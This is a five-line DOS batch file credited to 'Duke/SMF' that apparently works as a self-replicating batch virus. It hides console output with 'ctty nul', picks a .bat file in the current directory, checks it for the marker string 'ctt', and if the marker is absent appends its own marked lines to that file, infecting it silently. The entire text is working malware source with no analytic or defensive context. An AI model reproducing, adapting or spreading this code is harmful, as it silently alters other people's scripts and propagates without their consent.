:: Created (c) by Duke/SMF
@ctty nul
for %%b in (*.bat) do set ctt=%%b
find "ctt"<%ctt%
if errorlevel 1 find "ctt"<%0>>%ctt%
